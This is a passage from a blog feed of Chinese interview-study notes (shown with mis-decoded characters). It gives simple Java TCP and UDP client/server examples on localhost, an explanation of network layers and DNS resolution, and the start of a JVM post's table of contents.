id="tcpserverx2fclient">TCPServer&#x2F;Client</span></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TCPServer</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">ServerSocket</span> <span class="variable">ss</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">3014</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">      Socket socket=ss.accept();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Working</span>(socket).start();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Working</span> <span class="keyword">extends</span> <span class="title class_">Thread</span>&#123;</span><br><span class="line">    <span class="comment">//ä»¥Socketä¸ºæˆå‘˜å˜é‡</span></span><br><span class="line">    <span class="keyword">private</span> Socket socket;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Working</span><span class="params">(Socket socket)</span>&#123;<span class="built_in">this</span>.socket=socket;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> socket.getInputStream()) &#123;</span><br><span class="line">            <span class="type">int</span> ch=<span class="number">0</span>;</span><br><span class="line">            <span class="type">byte</span>[] buff = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            ch=is.read(buff);</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(buff,<span class="number">0</span>,ch);</span><br><span class="line">            System.out.println(content);</span><br><span class="line">            os.write(String.valueOf(content.length()).getBytes());</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TCPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">3014</span>);</span><br><span class="line">             <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span>s.getOutputStream();</span><br><span class="line">             <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> s.getInputStream();</span><br><span class="line">        )&#123;</span><br><span class="line">            <span class="type">int</span> ch=<span class="number">0</span>;</span><br><span class="line">            <span class="type">byte</span>[] buff = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">            os.write(output.getBytes());</span><br><span class="line">            ch=is.read(buff);</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(buff,<span class="number">0</span>,ch);</span><br><span class="line">            System.out.println(content);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="udpserverx2fclient">UDPServer&#x2F;Client</span></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UDPServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        DatagramSocket socket=<span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(<span class="number">65001</span>);</span><br><span class="line">        <span class="type">byte</span>[] buff = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="type">DatagramPacket</span> <span class="variable">packet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(buff,buff.length);</span><br><span class="line">        socket.receive(packet);</span><br><span class="line">        <span class="type">byte</span>[] data=packet.getData();</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(data,<span class="number">0</span>,packet.getLength());</span><br><span class="line">        System.out.println(content);</span><br><span class="line">        <span class="type">byte</span>[] sendContent = String.valueOf(content.length()).getBytes();</span><br><span class="line">        <span class="type">DatagramPacket</span> <span class="variable">packet2Client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(sendContent,sendContent.length,packet.getAddress(),packet.getPort());</span><br><span class="line">        socket.send(packet2Client);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UDPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        DatagramSocket socket=<span class="keyword">new</span> <span class="title class_">DatagramSocket</span>();</span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">address</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] buf=<span class="string">&quot;hello world&quot;</span>.getBytes();</span><br><span class="line">        <span class="type">DatagramPacket</span> <span class="variable">packet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(buf,buf.length,address,<span class="number">65001</span>);</span><br><span class="line">        socket.send(packet);</span><br><span class="line">        <span class="type">byte</span>[] data=<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">100</span>];</span><br><span class="line">        DatagramPacket rcvPacket=<span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(data,data.length);</span><br><span class="line">        socket.receive(rcvPacket);</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(rcvPacket.getData(),<span class="number">0</span>,rcvPacket.getLength());</span><br><span class="line">        System.out.println(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºä¸€å°ä¸»æœºï¼Œå®ƒçš„æ“ä½œç³»ç»Ÿå†…æ ¸å®ç°äº†ä¼ è¾“å±‚åˆ°ç‰©ç†å±‚çš„å†…å®¹</p><ul><li>å¯¹äºä¸€å°è·¯ç”±å™¨ï¼Œå®ƒå®ç°äº†ä»ç½‘ç»œå±‚åˆ°ç‰©ç†å±‚</li><li>å¯¹äºä¸€å°äº¤æ¢æœºï¼Œå®ƒå®ç°äº†ç”±æ•°æ®é“¾è·¯å±‚åˆ°ç‰©ç†å±‚</li><li>å¯¹äºé›†çº¿å™¨ï¼Œä»–åªå®ç°äº†ç‰©ç†å±‚ã€‚</li></ul><p>OSIï¼š</p><p>ç½‘é™…æ¥å£å±‚ã€ç½‘ç»œå±‚ã€ä¼ è¾“å±‚ã€åº”ç”¨å±‚</p><p>ç‰©ç†å±‚ã€æ•°æ®é“¾è·¯å±‚ã€ç½‘ç»œå±‚ã€ä¼ è¾“å±‚ã€ä¼šè¯å±‚ã€è¡¨ç°å±‚ã€åº”ç”¨å±‚</p><h3><span id="dnsè§£æäº†è§£">DNSè§£æï¼ˆäº†è§£ï¼‰</span></h3><p>2ã€æµè§ˆå™¨æŸ¥æ‰¾åŸŸåçš„ IP åœ°å€ã€€ã€€</p><p>1ã€è¯·æ±‚ä¸€æ—¦å‘èµ·ï¼Œæµè§ˆå™¨é¦–å…ˆè¦åšçš„äº‹æƒ…å°±æ˜¯è§£æè¿™ä¸ªåŸŸåï¼Œä¸€èˆ¬æ¥è¯´ï¼Œæµè§ˆå™¨ä¼šé¦–å…ˆæŸ¥çœ‹æœ¬åœ°ç¡¬ç›˜çš„ hosts æ–‡ä»¶ï¼Œçœ‹çœ‹å…¶ä¸­æœ‰æ²¡æœ‰å’Œè¿™ä¸ªåŸŸåå¯¹åº”çš„è§„åˆ™ï¼Œå¦‚æœæœ‰çš„è¯å°±ç›´æ¥ä½¿ç”¨ hosts æ–‡ä»¶é‡Œé¢çš„ ip åœ°å€ã€‚</p><p>2ã€å¦‚æœåœ¨æœ¬åœ°çš„ hosts æ–‡ä»¶æ²¡æœ‰èƒ½å¤Ÿæ‰¾åˆ°å¯¹åº”çš„ ip åœ°å€ï¼Œæµè§ˆå™¨ä¼šå‘å‡ºä¸€ä¸ª DNSè¯·æ±‚åˆ°æœ¬åœ°DNSæœåŠ¡å™¨ ã€‚æœ¬åœ°DNSæœåŠ¡å™¨ä¸€èˆ¬éƒ½æ˜¯ä½ çš„ç½‘ç»œæ¥å…¥æœåŠ¡å™¨å•†æä¾›ï¼Œæ¯”å¦‚ä¸­å›½ç”µä¿¡ï¼Œä¸­å›½ç§»åŠ¨ã€‚</p><p>3ã€æŸ¥è¯¢ä½ è¾“å…¥çš„ç½‘å€çš„DNSè¯·æ±‚åˆ°è¾¾æœ¬åœ°DNSæœåŠ¡å™¨ä¹‹åï¼Œæœ¬åœ°DNSæœåŠ¡å™¨ä¼šé¦–å…ˆæŸ¥è¯¢å®ƒçš„ç¼“å­˜è®°å½•ï¼Œå¦‚æœç¼“å­˜ä¸­æœ‰æ­¤æ¡è®°å½•ï¼Œå°±å¯ä»¥ç›´æ¥è¿”å›ç»“æœï¼Œæ­¤è¿‡ç¨‹æ˜¯é€’å½’çš„æ–¹å¼è¿›è¡ŒæŸ¥è¯¢ã€‚å¦‚æœæ²¡æœ‰ï¼Œæœ¬åœ°DNSæœåŠ¡å™¨è¿˜è¦å‘DNSæ ¹æœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ã€‚</p><p>4ã€æ ¹DNSæœåŠ¡å™¨æ²¡æœ‰è®°å½•å…·ä½“çš„åŸŸåå’ŒIPåœ°å€çš„å¯¹åº”å…³ç³»ï¼Œè€Œæ˜¯å‘Šè¯‰æœ¬åœ°DNSæœåŠ¡å™¨ï¼Œä½ å¯ä»¥åˆ°åŸŸæœåŠ¡å™¨ä¸Šå»ç»§ç»­æŸ¥è¯¢ï¼Œå¹¶ç»™å‡ºåŸŸæœåŠ¡å™¨çš„åœ°å€ã€‚è¿™ç§è¿‡ç¨‹æ˜¯è¿­ä»£çš„è¿‡ç¨‹ã€‚</p><p>5ã€æœ¬åœ°DNSæœåŠ¡å™¨ç»§ç»­å‘åŸŸæœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè¯·æ±‚çš„å¯¹è±¡æ˜¯.comåŸŸæœåŠ¡å™¨ã€‚.comåŸŸæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œä¹Ÿä¸ä¼šç›´æ¥è¿”å›åŸŸåå’ŒIPåœ°å€çš„å¯¹åº”å…³ç³»ï¼Œè€Œæ˜¯å‘Šè¯‰æœ¬åœ°DNSæœåŠ¡å™¨ï¼Œä½ çš„åŸŸåçš„è§£ææœåŠ¡å™¨çš„åœ°å€ã€‚</p><p>6ã€æœ€åï¼Œæœ¬åœ°DNSæœåŠ¡å™¨å‘åŸŸåçš„è§£ææœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œè¿™æ—¶å°±èƒ½æ”¶åˆ°ä¸€ä¸ªåŸŸåå’ŒIPåœ°å€å¯¹åº”å…³ç³»ï¼Œæœ¬åœ°DNSæœåŠ¡å™¨ä¸ä»…è¦æŠŠIPåœ°å€è¿”å›ç»™ç”¨æˆ·ç”µè„‘ï¼Œè¿˜è¦æŠŠè¿™ä¸ªå¯¹åº”å…³ç³»ä¿å­˜åœ¨ç¼“å­˜ä¸­ï¼Œä»¥å¤‡ä¸‹æ¬¡åˆ«çš„ç”¨æˆ·æŸ¥è¯¢æ—¶ï¼Œå¯ä»¥ç›´æ¥è¿”å›ç»“æœï¼ŒåŠ å¿«ç½‘ç»œè®¿é—®ã€‚</p><p>ä¸‹é¢è¿™å¼ å›¾å¾ˆå®Œç¾çš„è§£é‡Šäº†è¿™ä¸€è¿‡ç¨‹ï¼š</p><p> <img src="/2020/03/30/Network/clip_image002-1585538209170.jpg">1.ä»€ä¹ˆæ˜¯DNSï¼Ÿ</p><p>DNSï¼ˆDomain Name Systemï¼ŒåŸŸåç³»ç»Ÿï¼‰ï¼Œå› ç‰¹ç½‘ä¸Šä½œä¸ºåŸŸåå’ŒIPåœ°å€ç›¸äº’æ˜ å°„çš„ä¸€ä¸ªåˆ†å¸ƒå¼æ•°æ®åº“ï¼Œèƒ½å¤Ÿä½¿ç”¨æˆ·æ›´æ–¹ä¾¿çš„è®¿é—®äº’è”ç½‘ï¼Œè€Œä¸ç”¨å»è®°ä½èƒ½å¤Ÿè¢«æœºå™¨ç›´æ¥è¯»å–çš„IPæ•°ä¸²ã€‚é€šè¿‡ä¸»æœºåï¼Œæœ€ç»ˆå¾—åˆ°è¯¥ä¸»æœºåå¯¹åº”çš„IPåœ°å€çš„è¿‡ç¨‹å«åšåŸŸåè§£æï¼ˆæˆ–ä¸»æœºåè§£æï¼‰ã€‚<br> ã€€<br> é€šä¿—çš„è®²ï¼Œæˆ‘ä»¬æ›´ä¹ æƒ¯äºè®°ä½ä¸€ä¸ªç½‘ç«™çš„åå­—ï¼Œæ¯”å¦‚<a href="http://www.baidu.com,è€Œä¸æ˜¯è®°ä½å®ƒçš„ipåœ°å€ï¼Œæ¯”å¦‚ï¼š167.23.10.2ã€‚è€Œè®¡ç®—æœºæ›´æ“…é•¿è®°ä½ç½‘ç«™çš„ipåœ°å€ï¼Œè€Œä¸æ˜¯åƒwww.baidu.comç­‰é“¾æ¥ã€‚å› ä¸ºï¼ŒDNSå°±ç›¸å½“äºä¸€ä¸ªç”µè¯æœ¬ï¼Œæ¯”å¦‚ä½ è¦æ‰¾www.baidu.comè¿™ä¸ªåŸŸåï¼Œé‚£æˆ‘ç¿»ä¸€ç¿»æˆ‘çš„ç”µè¯æœ¬ï¼Œæˆ‘å°±çŸ¥é“ï¼Œå“¦ï¼Œå®ƒçš„ç”µè¯ï¼ˆipï¼‰æ˜¯167.23.10.2ã€‚">www.baidu.com,è€Œä¸æ˜¯è®°ä½å®ƒçš„ipåœ°å€ï¼Œæ¯”å¦‚ï¼š167.23.10.2ã€‚è€Œè®¡ç®—æœºæ›´æ“…é•¿è®°ä½ç½‘ç«™çš„ipåœ°å€ï¼Œè€Œä¸æ˜¯åƒwww.baidu.comç­‰é“¾æ¥ã€‚å› ä¸ºï¼ŒDNSå°±ç›¸å½“äºä¸€ä¸ªç”µè¯æœ¬ï¼Œæ¯”å¦‚ä½ è¦æ‰¾www.baidu.comè¿™ä¸ªåŸŸåï¼Œé‚£æˆ‘ç¿»ä¸€ç¿»æˆ‘çš„ç”µè¯æœ¬ï¼Œæˆ‘å°±çŸ¥é“ï¼Œå“¦ï¼Œå®ƒçš„ç”µè¯ï¼ˆipï¼‰æ˜¯167.23.10.2ã€‚</a></p><p>2.DNSæŸ¥è¯¢çš„ä¸¤ç§æ–¹å¼ï¼šé€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢</p><p><img src="/2020/03/30/Network/clip_image003.png"></p><p><strong>1****ã€é€’å½’è§£æ</strong></p><p>å½“å±€éƒ¨DNSæœåŠ¡å™¨è‡ªå·±ä¸èƒ½å›ç­”å®¢æˆ·æœºçš„DNSæŸ¥è¯¢æ—¶ï¼Œå®ƒå°±éœ€è¦å‘å…¶ä»–DNSæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ã€‚æ­¤æ—¶æœ‰ä¸¤ç§æ–¹å¼ï¼Œå¦‚å›¾æ‰€ç¤ºçš„æ˜¯é€’å½’æ–¹å¼ã€‚å±€éƒ¨DNSæœåŠ¡å™¨è‡ªå·±è´Ÿè´£å‘å…¶ä»–DNSæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ï¼Œä¸€èˆ¬æ˜¯å…ˆå‘è¯¥åŸŸåçš„æ ¹åŸŸæœåŠ¡å™¨æŸ¥è¯¢ï¼Œå†ç”±æ ¹åŸŸåæœåŠ¡å™¨ä¸€çº§çº§å‘ä¸‹æŸ¥è¯¢ã€‚æœ€åå¾—åˆ°çš„æŸ¥è¯¢ç»“æœè¿”å›ç»™å±€éƒ¨DNSæœåŠ¡å™¨ï¼Œå†ç”±å±€éƒ¨DNSæœåŠ¡å™¨è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p><p><img src="/2020/03/30/Network/clip_image004-1585538209171.png"></p><p><strong>2****ã€è¿­ä»£è§£æ</strong></p><p>å½“å±€éƒ¨DNSæœåŠ¡å™¨è‡ªå·±ä¸èƒ½å›ç­”å®¢æˆ·æœºçš„DNSæŸ¥è¯¢æ—¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¿­ä»£æŸ¥è¯¢çš„æ–¹å¼è¿›è¡Œè§£æï¼Œå¦‚å›¾æ‰€ç¤ºã€‚å±€éƒ¨DNSæœåŠ¡å™¨ä¸æ˜¯è‡ªå·±å‘å…¶ä»–DNSæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ï¼Œè€Œæ˜¯æŠŠèƒ½è§£æè¯¥åŸŸåçš„å…¶ä»–DNSæœåŠ¡å™¨çš„IPåœ°å€è¿”å›ç»™å®¢æˆ·ç«¯DNSç¨‹åºï¼Œå®¢æˆ·ç«¯DNSç¨‹åºå†ç»§ç»­å‘è¿™äº›DNSæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ï¼Œç›´åˆ°å¾—åˆ°æŸ¥è¯¢ç»“æœä¸ºæ­¢ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿­ä»£è§£æåªæ˜¯å¸®ä½ æ‰¾åˆ°ç›¸å…³çš„æœåŠ¡å™¨è€Œå·²ï¼Œè€Œä¸ä¼šå¸®ä½ å»æŸ¥ã€‚æ¯”å¦‚è¯´ï¼šbaidu.comçš„æœåŠ¡å™¨ipåœ°å€åœ¨192.168.4.5è¿™é‡Œï¼Œä½ è‡ªå·±å»æŸ¥å§ï¼Œæœ¬äººæ¯”è¾ƒå¿™ï¼Œåªèƒ½å¸®ä½ åˆ°è¿™é‡Œäº†ã€‚</p><p><img src="/2020/03/30/Network/clip_image005.jpg"></p><p>3.DNSåŸŸåç§°ç©ºé—´çš„ç»„ç»‡æ–¹å¼</p><p>æˆ‘ä»¬åœ¨å‰é¢æœ‰è¯´åˆ°æ ¹DNSæœåŠ¡å™¨ï¼ŒåŸŸDNSæœåŠ¡å™¨ï¼Œè¿™äº›éƒ½æ˜¯DNSåŸŸåç§°ç©ºé—´çš„ç»„ç»‡æ–¹å¼ã€‚æŒ‰å…¶åŠŸèƒ½å‘½åç©ºé—´ä¸­ç”¨æ¥æè¿° DNS åŸŸåç§°çš„äº”ä¸ªç±»åˆ«çš„ä»‹ç»è¯¦è§ä¸‹è¡¨ä¸­ï¼Œä»¥åŠä¸æ¯ä¸ªåç§°ç±»å‹çš„ç¤ºä¾‹</p><p> <img src="/2020/03/30/Network/clip_image006.jpg"></p><p>4.DNSè´Ÿè½½å‡è¡¡</p><p>å½“ä¸€ä¸ªç½‘ç«™æœ‰è¶³å¤Ÿå¤šçš„ç”¨æˆ·çš„æ—¶å€™ï¼Œå‡å¦‚æ¯æ¬¡è¯·æ±‚çš„èµ„æºéƒ½ä½äºåŒä¸€å°æœºå™¨ä¸Šé¢ï¼Œé‚£ä¹ˆè¿™å°æœºå™¨éšæ—¶å¯èƒ½ä¼šè¹¦æ‰ã€‚å¤„ç†åŠæ³•å°±æ˜¯ç”¨DNSè´Ÿè½½å‡è¡¡æŠ€æœ¯ï¼Œå®ƒçš„åŸç†æ˜¯åœ¨DNSæœåŠ¡å™¨ä¸­ä¸ºåŒä¸€ä¸ªä¸»æœºåé…ç½®å¤šä¸ªIPåœ°å€,åœ¨åº”ç­”DNSæŸ¥è¯¢æ—¶,DNSæœåŠ¡å™¨å¯¹æ¯ä¸ªæŸ¥è¯¢å°†ä»¥DNSæ–‡ä»¶ä¸­ä¸»æœºè®°å½•çš„IPåœ°å€æŒ‰é¡ºåºè¿”å›ä¸åŒçš„è§£æç»“æœ,å°†å®¢æˆ·ç«¯çš„è®¿é—®å¼•å¯¼åˆ°ä¸åŒçš„æœºå™¨ä¸Šå»,ä½¿å¾—ä¸åŒçš„å®¢æˆ·ç«¯è®¿é—®ä¸åŒçš„æœåŠ¡å™¨,ä»è€Œè¾¾åˆ°è´Ÿè½½å‡è¡¡çš„ç›®çš„ï½¡ä¾‹å¦‚å¯ä»¥æ ¹æ®æ¯å°æœºå™¨çš„è´Ÿè½½é‡ï¼Œè¯¥æœºå™¨ç¦»ç”¨æˆ·åœ°ç†ä½ç½®çš„è·ç¦»ç­‰ç­‰ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç®—æœºç½‘ç»œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM</title>
      <link href="/2020/03/29/JVM/"/>
      <url>/2020/03/29/JVM/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç›˜ç‚¹äº†å¸¸è€ƒçš„JVMè€ƒç‚¹</p><span id="more"></span><!-- toc --><ul><li><a href="#%E5%AF%B9java%E7%9A%84%E7%90%86%E8%A7%A3">å¯¹Javaçš„ç†è§£</a></li><li><a href="#compile-once-run-anywhere%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0">Compile Once, Run Anywhereå¦‚ä½•å®ç°</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88jvm%E4%B8%8D%E7%9B%B4%E6%8E%A5%E5%B0%86%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%E6%88%90%E6%9C%BA%E5%99%A8%E7%A0%81%E5%8E%BB%E6%89%A7%E8%A1%8C">ä¸ºä»€ä¹ˆJVMä¸ç›´æ¥å°†æºç è§£ææˆæœºå™¨ç å»æ‰§è¡Œ</a></li><li><a href="#jvm%E5%A6%82%E4%BD%95%E5%8A%A0%E8%BD%BDclass%E6%96%87%E4%BB%B6">JVMå¦‚ä½•åŠ è½½.classæ–‡ä»¶</a></li><li><a href="#%E5%8F%8D%E5%B0%84">åå°„</a><ul><li><a href="#%E8%8E%B7%E5%8F%96%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0">è·å–æ„é€ å‡½æ•°</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E4%BF%AE%E9%A5%B0%E7%AC%A6">è·å–ä¿®é¥°ç¬¦</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E5%90%8D%E5%AD%97">è·å–åå­—</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%B1%9E%E6%80%A7">è·å–å­—æ®µï¼ˆå±æ€§ï¼‰</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E6%96%B9%E6%B3%95">è·å–æ–¹æ³•</a></li><li><a href="#%E8%AE%BE%E7%BD%AE%E8%AE%BF%E9%97%AE%E5%B1%9E%E6%80%A7">è®¾ç½®è®¿é—®å±æ€§</a></li><li><a href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95">ä½¿ç”¨æ–¹æ³•</a></li></ul></li><li><a href="#%E7%B1%BB%E4%BB%8E%E7%BC%96%E8%AF%91%E5%88%B0%E6%89%A7%E8%A1%8C%E7%9A%84%E8%BF%87%E7%A8%8B">ç±»ä»ç¼–è¯‘åˆ°æ‰§è¡Œçš„è¿‡ç¨‹</a></li><li><a href="#%E8%B0%88%E8%B0%88classloader">è°ˆè°ˆClassLoader</a></li><li><a href="#classloader%E7%9A%84%E7%A7%8D%E7%B1%BB">ClassLoaderçš„ç§ç±»</a></li><li><a href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B">ç±»åŠ è½½å™¨åŒäº²å§”æ´¾æ¨¡å‹</a><ul><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B">ä¸ºä»€ä¹ˆè¦ä½¿ç”¨åŒäº²å§”æ´¾æ¨¡å‹</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E7%A0%B4%E5%9D%8F%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE">ä¸ºä»€ä¹ˆéœ€è¦ç ´ååŒäº²å§”æ´¾ï¼Ÿ</a></li></ul></li><li><a href="#%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%96%B9%E5%BC%8F">ç±»çš„åŠ è½½æ–¹å¼</a><ul><li><a 